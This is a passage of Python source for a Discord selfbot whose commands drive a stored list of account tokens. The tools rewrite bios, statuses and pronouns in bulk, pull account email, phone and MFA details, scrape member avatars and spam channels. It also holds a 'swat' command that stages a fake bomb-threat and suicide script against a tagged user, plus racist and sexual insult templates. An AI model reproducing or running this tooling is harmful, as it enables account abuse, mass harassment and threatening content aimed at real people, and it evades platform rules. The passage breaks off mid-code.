            for i, (token, pronoun) in enumerate(zip(selected_tokens, pronouns), 1):
                headers['Authorization'] = token
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/profile',
                    headers=headers,
                    json={'pronouns': pronoun}
                ) as resp:
                    if resp.status == 200:
                        success += 1
                    

                    progress = f"""```ansi\n
{cyan}Changing Pronouns...{reset}
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}

Current pronouns: {pronoun}```"""
                    await status_msg.edit(content=progress)
                    await asyncio.sleep(0.5)


        await status_msg.edit(content=f"""```ansi\n
{green}Pronoun Change Complete{reset}

Successfully changed: {success}/{len(selected_tokens)} pronouns```
""")
    except asyncio.TimeoutError:
        await status_msg.edit(content=" timed out")
    except Exception as e:
        await status_msg.edit(content=f" error occurred: {str(e)}")
@bot.command()
@require_password()
async def tbio(ctx, *, bio: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
{cyan}Token Bio Changer{reset}
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            num = int(amount)
            if num > total_tokens:
                await status_msg.edit(content="```Not enough tokens available```")
                return
            selected_tokens = random.sample(tokens, num)

        if bio is None:
            await status_msg.edit(content=f"""```ansi
Choose bio mode:
1. {yellow}Random{reset} (generates random bios)
2. {green}List{reset} (uses bios from tbio.txt)```""")
            
            mode_msg = await bot.wait_for('message', timeout=30.0, check=check)
            mode = mode_msg.content
            
            if mode == "1":
                bios = [f"Bio #{i} | " + ''.join(random.choices(string.ascii_letters + string.digits, k=20)) for i in range(len(selected_tokens))]
            elif mode == "2":
                try:
                    with open('tbio.txt', 'r') as f:
                        bio_list = [line.strip() for line in f if line.strip()]
                        bios = random.choices(bio_list, k=len(selected_tokens))
                except FileNotFoundError:
                    await status_msg.edit(content="```tbio.txt not found```")
                    return
        else:
            bios = [bio] * len(selected_tokens)

        success = 0
        headers = {'Authorization': '', 'Content-Type': 'application/json'}
        
        async with aiohttp.ClientSession() as session:
            for i, (token, bio_text) in enumerate(zip(selected_tokens, bios), 1):
                headers['Authorization'] = token
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/profile',
                    headers=headers,
                    json={'bio': bio_text}
                ) as resp:
                    if resp.status == 200:
                        success += 1
                    
                    progress = f"""```ansi
{cyan}Changing Bios...{reset}
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Current bio: {bio_text[:50]}{'...' if len(bio_text) > 50 else ''}```"""
                    await status_msg.edit(content=progress)
                    await asyncio.sleep(0.5)

        await status_msg.edit(content=f"""```ansi
{green}Bio Change Complete{reset}
Successfully changed: {success}/{len(selected_tokens)} bios```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")

loop_task = None
@bot.command()
@require_password()
async def nickloop(ctx, *, nicknames: str):
    global loop_task
    await ctx.send(f"```Rotating nickname to: {nicknames}```")
    if loop_task:
        await ctx.send("```A nickname loop is already running.```")
        return

    nicknames_list = [nickname.strip() for nickname in nicknames.split(',')]

    async def change_nickname():
        while True:
            for nickname in nicknames_list:
                try:
                    await ctx.guild.me.edit(nick=nickname) 
                    await asyncio.sleep(15)  
                except discord.HTTPException as e:
                    await ctx.send(f"```Error changing nickname: {e}```")
                    return 

    loop_task = bot.loop.create_task(change_nickname())

@bot.command()
@require_password()
async def stopnickloop(ctx):
    global loop_task

    if loop_task:
        loop_task.cancel()
        loop_task = None
        await ctx.send("```Nickname loop stopped.```")
    else:
        await ctx.send("```No nickname loop is running.```")
webhookcopy_status = {}
webhook_urls = {}

@bot.command()
@require_password()
async def webhookcopy(ctx):
    avatar_url = str(ctx.author.avatar_url) if ctx.author.avatar else str(ctx.author.default_avatar_url)

    async with aiohttp.ClientSession() as session:
        async with session.get(avatar_url) as response:
            if response.status == 200:
                avatar_data = io.BytesIO(await response.read())
                webhook = await ctx.channel.create_webhook(name=ctx.author.display_name, avatar=avatar_data.read())
                

                webhook_urls[ctx.author.id] = webhook.url
                webhookcopy_status[ctx.author.id] = True
                
                await ctx.send("```Webhook has been created and webhook copying is enabled.```")
            else:
                await ctx.send("```Failed to fetch avatar for webhook.```")

@bot.command()
@require_password()
async def webhookcopyoff(ctx):
    webhookcopy_status[ctx.author.id] = False
    await ctx.send("```Webhook copy has been disabled for you.```")

import aiofiles
@bot.command()
@require_password()
async def pfpscrape(ctx, amount: int = None):
    try:
        base_dir = os.path.join(os.getcwd(), 'pfps')
        if not os.path.exists(base_dir):
            os.makedirs(base_dir)
            
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        folder_path = os.path.join(base_dir, f'scrape_{timestamp}')
        os.makedirs(folder_path, exist_ok=True)
        
        members = list(ctx.guild.members)
        
        if amount is None or amount > len(members):
            amount = len(members)
        
        selected_members = random.sample(members, amount)
        
        success_count = 0
        failed_count = 0
        
        status_message = await ctx.send("```Starting profile picture scraping...```")
        
        async def download_pfp(member):
            try:
                if member.avatar:
                    if str(member.avatar).startswith('a_'):
                        avatar_url = f"https://cdn.discordapp.com/avatars/{member.id}/{member.avatar}.gif?size=1024"
                        file_extension = '.gif'
                    else:
                        avatar_url = f"https://cdn.discordapp.com/avatars/{member.id}/{member.avatar}.png?size=1024"
                        file_extension = '.png'
                else:
                    avatar_url = member.default_avatar.url
                    file_extension = '.png'
                
                safe_name = "".join(x for x in member.name if x.isalnum() or x in (' ', '-', '_'))
                file_name = f'{safe_name}_{member.id}{file_extension}'
                file_path = os.path.join(folder_path, file_name)
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(avatar_url) as resp:
                        if resp.status == 200:
                            data = await resp.read()
                            async with aiofiles.open(file_path, 'wb') as f:
                                await f.write(data)
                                print(f"Saved {file_name} to {file_path}")
                            return True
                        else:
                            print(f"Failed to download {member.name}'s avatar: Status {resp.status}")
                            return False
                        
            except Exception as e:
                print(f"Error downloading {member.name}'s pfp: {e}")
            return False
        
        chunk_size = 5
        for i in range(0, len(selected_members), chunk_size):
            chunk = selected_members[i:i + chunk_size]
            
            results = await asyncio.gather(*[download_pfp(member) for member in chunk])
            
            success_count += sum(1 for r in results if r)
            failed_count += sum(1 for r in results if not r)
            
            progress = (i + len(chunk)) / len(selected_members) * 100
            status = f"""```
PFP Scraping / Status %
Progress: {progress:.1f}%
Downloaded: {success_count}
Failed to download: {failed_count}
Remaining: {amount - (success_count + failed_count)}
Path: {folder_path}
```"""
            try:
                await status_message.edit(content=status)
            except:
                pass
            
            await asyncio.sleep(random.uniform(0.5, 1.0))

        final_status = f"""```
Profile scraping completed:
Scrapes Trird: {amount}
Downloaded: {success_count}
Failed to download: {failed_count}
Saved in: {folder_path}
```"""
        await status_message.edit(content=final_status)
        
    except Exception as e:
        print(f"Main error: {e}")
        await ctx.send(f"```Error: {str(e)}```")






@bot.command()
@require_password()
async def tstatus(ctx, *, status_text: str = None):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    if not status_text:
        await ctx.send("```Please provide a status text```")
        return

    status_msg = await ctx.send(f"""```ansi
\u001b[0;36mToken Status Changer\u001b[0m
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        success = 0
        
        async with aiohttp.ClientSession() as session:
            for i, token in enumerate(selected_tokens, 1):
                online_data = {
                    'status': 'online'
                }
                
                status_data = {
                    'custom_status': {
                        'text': status_text
                    },
                    'status': 'online'  
                }
                
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/settings',
                    headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    },
                    json=online_data
                ) as resp1:
                    
                    async with session.patch(
                        'https://discord.com/api/v9/users/@me/settings',
                        headers={
                            'Authorization': token,
                            'Content-Type': 'application/json'
                        },
                        json=status_data
                    ) as resp2:
                        if resp1.status == 200 and resp2.status == 200:
                            success += 1
                        
                        progress = f"""```ansi
\u001b[0;36mChanging Statuses...\u001b[0m
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}
Current status: {status_text}```"""
                        await status_msg.edit(content=progress)
                        await asyncio.sleep(0.5)

        await status_msg.edit(content=f"""```ansi
\u001b[0;32mStatus Change Complete\u001b[0m
Successfully changed: {success}/{len(selected_tokens)} statuses to: {status_text}```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")

@bot.command()
@require_password()
async def tstatusoff(ctx):
    tokens = loads_tokens()
    total_tokens = len(tokens)
    
    status_msg = await ctx.send(f"""```ansi
\u001b[0;36mToken Status Reset\u001b[0m
Total tokens available: {total_tokens}
How many tokens do you want to reset? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content="```Not enough tokens available```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content="```Invalid number```")
                return

        success = 0
        
        async with aiohttp.ClientSession() as session:
            for i, token in enumerate(selected_tokens, 1):

                reset_data = {
                    'custom_status': None,
                    'status': 'online' 
                }
                
                async with session.patch(
                    'https://discord.com/api/v9/users/@me/settings',
                    headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    },
                    json=reset_data
                ) as resp:
                    if resp.status == 200:
                        success += 1
                    
                    progress = f"""```ansi
\u001b[0;36mResetting Statuses...\u001b[0m
Progress: {i}/{len(selected_tokens)} ({(i/len(selected_tokens)*100):.1f}%)
Success: {success}```"""
                    await status_msg.edit(content=progress)
                    await asyncio.sleep(0.5)

        await status_msg.edit(content=f"""```ansi
\u001b[0;32mStatus Reset Complete\u001b[0m
Successfully reset: {success}/{len(selected_tokens)} statuses```""")

    except asyncio.TimeoutError:
        await status_msg.edit(content="```Command timed out```")
    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")

@bot.command()
@require_password()
async def tinfo(ctx, token_input: str):
    """Get token account information"""
    tokens = loads_tokens()
    
    try:
        index = int(token_input) - 1
        if 0 <= index < len(tokens):
            token = tokens[index]
        else:
            await ctx.send("```Invalid token number```")
            return
    except ValueError:
        token = token_input
        if token not in tokens:
            await ctx.send("```Invalid token```")
            return

    status_msg = await ctx.send("```Fetching token information...```")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                'https://discord.com/api/v9/users/@me',
                headers={
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }
            ) as resp:
                if resp.status != 200:
                    await status_msg.edit(content="```Failed to fetch token information```")
                    return
                
                user_data = await resp.json()
                
                async with session.get(
                    'https://discord.com/api/v9/users/@me/connections',
                    headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }
                ) as conn_resp:
                    connections = await conn_resp.json() if conn_resp.status == 200 else []

                async with session.get(
                    'https://discord.com/api/v9/users/@me/guilds',
                    headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }
                ) as guild_resp:
                    guilds = await guild_resp.json() if guild_resp.status == 200 else []

                created_at = datetime.fromtimestamp(((int(user_data['id']) >> 22) + 1420070400000) / 1000)
                created_date = created_at.strftime('%Y-%m-%d %H:%M:%S')

                info = f"""```ansi
        {blue}─────────────────────────────────────────────────────────────────────────────────────────────────────────────
                                \u001b[0;36mToken Account Information\u001b[0m

                                \u001b[0;33mBasic Information:\u001b[0m
                                Username: {user_data['username']}#{user_data['discriminator']}
                                ID: {user_data['id']}
                                Email: {user_data.get('email', 'Not available')}
                                Phone: {user_data.get('phone', 'Not available')}
                                Created: {created_date}
                                Verified: {user_data.get('verified', False)}
                                MFA Enabled: {user_data.get('mfa_enabled', False)}

                                \u001b[0;33mNitro Status:\u001b[0m
                                Premium: {bool(user_data.get('premium_type', 0))}
                                Type: {['None', 'Classic', 'Full'][user_data.get('premium_type', 0)]}

                                \u001b[0;33mStats:\u001b[0m
                                Servers: {len(guilds)}
                                Connections: {len(connections)}

                                \u001b[0;33mProfile:\u001b[0m
                                Bio: {user_data.get('bio', 'No bio set')}
                                Banner: {'Yes' if user_data.get('banner') else 'No'}
                                Avatar: {'Yes' if user_data.get('avatar') else 'Default'}
        {blue}─────────────────────────────────────────────────────────────────────────────────────────────────────────────

```"""

                await status_msg.edit(content=info)

    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")

bold_mode = False
cord_user = False
cord_mode = False
hash_mode = False
italic_mode = False
strong_mode = False
cyan_strong = False


@bot.command()
@require_password()
async def cord(ctx, user: discord.User):
    global cord_mode, cord_user
    cord_mode = True
    cord_user = user
    await ctx.send(f"```cord mode enabled for {user.name}```")

@bot.command()
@require_password()
async def cordoff(ctx):
    global cord_mode, cord_user
    cord_mode = False
    cord_user = None
    await ctx.send("```cord mode disabled```")


@bot.command()
@require_password()
async def bold(ctx):
    global bold_mode
    bold_mode = True
    await ctx.send("```enabling boldbess```")

@bot.command()
@require_password()
async def unbold(ctx):
    global bold_mode
    bold_mode = False
    await ctx.send("```disabling bold```")

@bot.command()
@require_password()
async def hashon(ctx):
    global hash_mode
    hash_mode = True
    await ctx.send("```enabling the hashmode```")

@bot.command()
@require_password()
async def hashoff(ctx):
    global hash_mode
    hash_mode = False
    await ctx.send("```disabling the hashmode```")
    
@bot.command()
@require_password()
async def italicon(ctx):
    global italic_mode
    italic_mode = True
    await ctx.send ("```enabling the italicness```")
    
@bot.command()
@require_password()
async def italicoff(ctx):
    global italic_mode
    italic_mode = False
    await ctx.send ("```disabling the italicness```")
    
@bot.command()
@require_password()
async def strongon(ctx):
    global strong_mode
    strong_mode = True
    await ctx.send (" # Enabling The Strongness")


magenta_strong = False    
@bot.command()
@require_password()
async def strongoff(ctx):
    global strong_mode
    strong_mode = False
    await ctx.send("# disabling the strongness")
    
@bot.command()
@require_password()
async def magentastrongon(ctx):
    global magenta_strong
    magenta_strong = True
    await ctx.send("enabling the colored strong")

@bot.command()
@require_password()
async def magentastrongoff(ctx):
    global magenta_strong
    magenta_strong = False
    await ctx.send ("disabling the colored strong")

@bot.command()
@require_password()
async def cyanstrongon(ctx):
    global cyan_strong
    cyan_strong = True
    await ctx.send("enabling the colored strong")

@bot.command()
@require_password()
async def cyanstrongoff(ctx):
    global cyan_strong
    cyan_strong = False
    await ctx.send("disabling the colored strong")
    
red_strong = False 
@bot.command()
@require_password()
async def redstrongon(ctx):
    global red_strong
    red_strong = True
    await ctx.send("enabling the colored strong")
    
@bot.command()
@require_password()
async def redstrongoff(ctx):
    global red_strong
    red_strong = False
    await ctx.send("disabling the colored strong")

yellow_strong = False

@bot.command()
@require_password()
async def yellowstrongon(ctx):
    global yellow_strong
    yellow_strong = True
    await ctx.send("enabling the colored strong")
    
@bot.command()
@require_password()
async def yellowstrongoff(ctx):
    global yellow_strong
    yellow_strong = False
    await ctx.send("disabling the colored strong")

  
black_strong = False
@bot.command()
@require_password()
async def blackstrongon(ctx):
    global black_strong
    black_strong = True
    await ctx.send("enabling the colored strong")
    
    
@bot.command()
@require_password()
async def blackstrongoff(ctx):
    global black_strong
    black_strong = False
    await ctx.send("disabling the colored strong")
      
@bot.command()
@require_password()
async def emojiexport(ctx):
    folder_name = "exported_emojis"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

    emojis = ctx.guild.emojis
    if not emojis:
        await ctx.send("No emojis found in this server.")
        return

    exported_count = 0
    for emoji in emojis:
        emoji_url = str(emoji.url)

        response = requests.get(emoji_url)
        if response.status_code == 200:
            with open(os.path.join(folder_name, f"{emoji.name}.png"), 'wb') as f:
                f.write(response.content)
            exported_count += 1
        else:
            print(f"Failed to download {emoji.name}")

    await ctx.send(f"```Exported {exported_count} emojis to folder: {folder_name}.```")

@bot.command()
@require_password()
async def pastemojis(ctx):
    folder_name = "exported_emojis"

    if not os.path.exists(folder_name):
        await ctx.send("```No exported emojis found. Please use the `.emojiexport` command first.```")
        return

    added_count = 0
    for filename in os.listdir(folder_name):
        if filename.endswith(".png") or filename.endswith(".gif"):
            with open(os.path.join(folder_name, filename), 'rb') as f:
                try:
                    emoji_name = filename.rsplit('.', 1)[0]
                    await ctx.guild.create_custom_emoji(name=emoji_name, image=f.read())
                    added_count += 1
                except discord.HTTPException as e:
                    await ctx.send(f"Failed to add emoji `{emoji_name}`: {e}")

    if added_count > 0:
        await ctx.send(f"```Successfully added {added_count} emojis to the server.```")
    else:
        await ctx.send("```No emojis were added.```")

import shutil

@bot.command()
@require_password()
async def wipemojis(ctx):
    folder_name = "exported_emojis"


    if os.path.exists(folder_name):
        shutil.rmtree(folder_name)  
        await ctx.send("```The exported emojis folder has been deleted successfully.```")
    else:
        await ctx.send("```No exported emojis folder found to delete.```")
        
        
@bot.command()
@require_password()
async def unfriendall(ctx):
    if ctx.author.id != bot.user.id:
        return await ctx.send("This command can only be used by the account owner.")

    confirmation_message = await ctx.send("Are you sure you want to unfriend all users? Type `yes` to confirm or `cancel` to abort.")

    def check(message):
        return message.author == ctx.author and message.channel == ctx.channel and message.content.lower() in ["yes", "cancel"]

    try:
        response = await bot.wait_for("message", check=check, timeout=30)

        if response.content.lower() == "cancel":
            await ctx.send("Unfriend all command canceled.")
            return
        elif response.content.lower() == "yes":
            await ctx.send("Unfriending all users...")

            friends = [user for user in bot.user.friends]
            unfriended_count = 0

            for friend in friends:
                try:
                    await friend.remove_friend()
                    unfriended_count += 1
                except Exception as e:
                    print(f"Failed to unfriend {friend.name}: {e}")

            await ctx.send(f"Successfully unfriended {unfriended_count} users.")
    except Exception as e:
        await ctx.send("An error occurred or the confirmation timed out.")
        print(f"Error in unfriendall command: {e}")
        
        
@bot.command()
@require_password()
async def swat(ctx, user: discord.User = None):
    if not user:
        await ctx.send("```Usage: $swat <@user>```")
        return

    locations = ["bedroom", "basement", "attic", "garage", "bathroom", "kitchen"]
    bomb_types = ["pipe bomb", "pressure cooker bomb", "homemade explosive", "IED", "chemical bomb"]
    police_units = ["SWAT team", "bomb squad", "tactical unit", "special forces", "counter-terrorism unit"]
    arrest_methods = ["broke down the door", "surrounded the house", "breached through windows", "used tear gas", "sent in K9 units"]
    
    location = random.choice(locations)
    bomb = random.choice(bomb_types)
    unit = random.choice(police_units)
    method = random.choice(arrest_methods)
    
    await ctx.send(f"```911, whats your ermgiance?📱\n{user.display_name}: you have 10minutes to come before i kill everyone in this house.\n911: Excuse me sir? Whats your name, and what are you planning on doing..\n<@{user.id}>: my name dose not mattter, i have a {bomb} inisde of my {location}, there are 4 people in the house.```")
    asyncio.sleep(1)
    await ctx.send(f"```911: Calling the {unit}. There is a possible {bomb} attack inside of <@{user.id}> residance.\nPolice Unit: On that ma'am, will send all units as fast as possible.```")
    asyncio.sleep(1)
    await ctx.send(f"```Police Unit: {user.display_name} WE HAVE YOU SURROUNDED, COME OUT PEACEFULLY\n<@{user.id}>: im a fucking loser```")
    story = f"```BREAKING NEWS: {user.display_name} was found dead after killing himself after police received an anonymous tip about a {bomb} in their {location}. The {unit} {method} and found multiple explosive devices.```"
    
    await ctx.send(story)
    
@bot.command(help='Ladders messages')
async def lm(ctx, *, sentence: str):
    await ctx.message.delete()

    words = []
    current_word = ""
    in_quotes = False
    quote_char = ""

    for char in sentence:
        if char in ('"'):  # Detect the start or end of a quoted phrase
            if in_quotes and char == quote_char:
                in_quotes = False
                words.append(current_word.strip())
                current_word = ""
            elif not in_quotes:
                in_quotes = True
                quote_char = char
            else:
                current_word += char  # For mismatched quotes inside quotes
        elif char.isspace() and not in_quotes:  # Split on spaces outside quotes
            if current_word:
                words.append(current_word.strip())
                current_word = ""
        else:
            current_word += char

    if current_word:  # Add any remaining text as a word
        words.append(current_word.strip())

    # Send each parsed word or phrase separately
    i = 0
    while i < len(words):
        word = words[i]
        try:
            await ctx.send(word)
            await asyncio.sleep(0.3)
            i += 1
        except discord.errors.HTTPException as e:
            print(f'Rate limit hit, retrying... Error : {e}')
            await asyncio.sleep(2.1)
            
@bot.command(help='Ladders messages')
@require_password()
async def fl(ctx, *, sentence: str):
    await ctx.message.delete()

    words = []
    current_word = ""
    in_quotes = False
    quote_char = ""

    for char in sentence:
        if char in ('"', "'"):  # Detect the start or end of a quoted phrase
            if in_quotes and char == quote_char:
                in_quotes = False
                words.append(current_word.strip())
                current_word = ""
            elif not in_quotes:
                in_quotes = True
                quote_char = char
            else:
                current_word += char  # For mismatched quotes inside quotes
        elif char.isspace() and not in_quotes:  # Split on spaces outside quotes
            if current_word:
                words.append(current_word.strip())
                current_word = ""
        else:
            current_word += char

    if current_word:
        words.append(current_word.strip())

    i = 0
    while i < len(words):
        word = words[i]
        try:
            await ctx.send(word)
            i += 1
        except discord.errors.HTTPException as e:
            print(f'Rate limit hit, retrying... Error : {e}')
            await asyncio.sleep(3)

@bot.command()
async def sp(ctx, times: int, *, message):
    await ctx.message.delete()

    for _ in range(times):
        try:
            await ctx.send(message)
        except discord.HTTPException as e:
            print(f'Error: {e}')
            await asyncio.sleep(3)
        await asyncio.sleep(0.3)
        
@bot.command()
@require_password()
async def fs(ctx, times: int, *, message):
    await ctx.message.delete()
    
    for _ in range(times):
        try:
            await ctx.send(message)
        except discord.HTTPException as e:
            print(f'Error: {e}')
            await asyncio.sleep(3)
            
@bot.command()
@require_password()
async def defw(ctx, *, word: str):
    await ctx.message.delete()
    response = requests.get(f'https://api.dictionaryapi.dev/api/v2/entries/en/{word}')
    if response.status_code == 200:
        data = response.json()
        if isinstance(data, list) and data:
            definition = data[0]['meanings'][0]['definitions'][0]['definition']
            await ctx.send(f'**{word.capitalize()}**: {definition}')
        else:
            await ctx.send(f'No definition found for {word}.', delete_after=5)
    else:
        await ctx.send(f'Error fetching definition for {word}.', delete_after=5)
        
auto_capitalism = False        
        
INSULT_API_URL = 'https://evilinsult.com/generate_insult.php?lang=en&type=json'

@bot.command()
@require_password()
async def insult(ctx, user: discord.User):
    await ctx.message.delete()
    try:
        response = requests.get(INSULT_API_URL)
        response.raise_for_status()
        insult = response.json()['insult']
        await ctx.send(f'{user.mention}, {insult}')
    except requests.RequestException as e:
        await ctx.send('Failed to fetch an insult. Please try again later.', delete_after=5)
        print(f'Error fetching insult: {e}', delete_after=5)

main_template = [
    "this nigga was riding a [vehicle] with [name] in the passenger seat and he jumped out the door and turned into [adjective1] [object]",
    "nigga you used a [object] to kill a [insect] on the ground while you looked around searching for [adjective1] [seaanimal]",
    "nigga you threw [adjective1] [object] at [name] and you looked at the corner of your room and saw [name] butt booty naked getting [action] by [animename]",
    "nigga you and your [family] created a movie called the [number] [object]s that had [adjective1] [body]",
    "nigga you fell asleep on [location] and woke up to your penis getting tickled by [adjective1] [animals]",
    "nigga your [family] dropped their [food] down the stairs and they bent down trying to pick it up and then [name] popped out of nowhere and started twerking",
    "nigga your [race] [family] [action] [adjective1] [insect] while looking up and down having stick drift in your [body] and everytime you meet [name] you get excited and turn into [adjective1] [object]",
    "nigga you were caught [action] in a [location] while holding a [object] with [name]",
    "nigga you tried to cook [food] but ended up summoning [animename] in your [room]",
    "nigga you were found dancing with [animals] at the [event] dressed as a [adjective1] [object]",
    "nigga your [family] was seen playing [sport] with [name] at the [location] wearing [adjective1] [clothing]",
    "nigga you got into a fight with a [adjective1] [animal] while [action] and [name] recorded it",
    "nigga you transformed into a [adjective1] [mythicalcreature] after eating [food] given by [name]",
    "nigga you wrote a love letter to [name] and ended up getting chased by [insect]",
    "nigga you were singing [song] at the [event] when [animename] appeared and joined you",
    "nigga you tripped over a [object] while running from [animals] and fell into [location]",
    "nigga you were dreaming about [animename] and woke up covered in [food]",
    "nigga you and [name] went on an adventure to find the [adjective1] [object] but got lost in [location]",
    "nigga you were spotted riding a [vehicle] through the [location] with [adjective1] [animals]",
    "nigga your [family] decided to host a [event] in the [room] and invited [name] to join",
    "nigga you tried to impress [name] by [action] with a [object] but ended up embarrassing yourself",
    "nigga you and [name] got locked in a [room] with [adjective1] [animals] and had to find a way out",
    "nigga you participated in a [sport] match at the [event] and got cheered on by [animename]",
    "nigga you attempted to [action] in the [location] but got interrupted by [animals]",
    "nigga you discovered a hidden talent for [sport] while hanging out with [name] at the [location]",
    "nigga you found a [adjective1] [object] and decided to use it to prank [name] at the [event]",
    "nigga you got lost in the [location] while looking for [adjective1] [animals] and had to call [name] for help",
]

names = ["zirus", "yusky", "jason bourne", "huq", "ruin", "john wick", "mike wazowski", "thor", "spongebob", "patrick", "harry potter", "darth vader"]
adjectives = ["fluffy", "smelly", "huge", "tiny", "stinky", "bright", "dark", "slippery", "rough", "smooth"]
objects = ["rock", "pencil", "keyboard", "phone", "bottle", "book", "lamp", "balloon", "sock", "remote"]
insects = ["beetle", "cockroach", "dragonfly", "ant", "mosquito", "butterfly", "bee"]
seaanimals = ["dolphin", "octopus", "shark", "whale", "seal", "jellyfish", "crab"]
actions = ["kissing", "hugging", "fighting", "dancing", "singing", "running", "jumping", "crawling"]
animenames = ["itachi", "naruto", "goku", "luffy", "zoro", "sasuke", "vegeta"]
families = ["siblings", "cousins", "parents", "grandparents", "aunt", "uncle", "stepbrother", "stepsister"]
numbers = ["one", "two", "three", "four", "five", "six", "seven"]
bodies = ["head", "arm", "leg", "hand", "foot", "nose", "ear"]
locations = ["park", "beach", "library", "mall", "school", "stadium", "restaurant"]
animals = ["dog", "cat", "hamster", "elephant", "lion", "tiger", "bear", "giraffe"]
races = ["asian", "african", "caucasian", "hispanic", "native american", "martian"]
foods = ["pizza", "burger", "pasta", "taco", "sushi", "ice cream", "sandwich"]
events = ["concert", "festival", "wedding", "party", "ceremony"]
sports = ["soccer", "basketball", "baseball", "tennis", "cricket"]
clothing = ["shirt", "pants", "hat", "shoes", "jacket"]
mythicalcreatures = ["dragon", "unicorn", "phoenix", "griffin", "centaur"]
songs = ["despacito", "baby shark", "old town road", "shape of you", "bohemian rhapsody"]
vehicles = ["bike", "car", "scooter", "skateboard", "bus", "train", "airplane", "boat"]
rooms = ["living room", "bedroom", "kitchen", "bathroom", "attic", "basement", "garage"]

def replace_placeholders(template):
    template = template.replace("[name]", random.choice(names))
    template = template.replace("[adjective1]", random.choice(adjectives))
    template = template.replace("[object]", random.choice(objects))
    template = template.replace("[insect]", random.choice(insects))
    template = template.replace("[seaanimal]", random.choice(seaanimals))
    template = template.replace("[action]", random.choice(actions))
    template = template.replace("[animename]", random.choice(animenames))
    template = template.replace("[family]", random.choice(families))
    template = template.replace("[number]", random.choice(numbers))
    template = template.replace("[body]", random.choice(bodies))
    template = template.replace("[location]", random.choice(locations))
    template = template.replace("[animals]", random.choice(animals))
    template = template.replace("[race]", random.choice(races))
    template = template.replace("[food]", random.choice(foods))
    template = template.replace("[event]", random.choice(events))
    template = template.replace("[sport]", random.choice(sports))
    template = template.replace("[clothing]", random.choice(clothing))
    template = template.replace("[mythicalcreature]", random.choice(mythicalcreatures))
    template = template.replace("[song]", random.choice(songs))
    template = template.replace("[vehicle]", random.choice(vehicles))
    template = template.replace("[room]", random.choice(rooms))
    template = template.replace("[animal]", random.choice(animals))
    return template

def generate_pack():
    template = random.choice(main_template)
    pack = replace_placeholders(template)
    return pack

@bot.command()
@require_password()
async def pg2(ctx):
    await ctx.message.delete()
    pack = generate_pack()
    await ctx.send(pack)
    

        
bump_task = None
@bot.command()
@require_password()
async def autobump(ctx):
    global bump_task
    
    if bump_task is not None:
        await ctx.send("```Auto bump is already running```")
        return
    headers = {
        "authority": "discord.com",
        "method": "PATCH",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "origin": "https://discord.com",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "Asia/Calcutta",
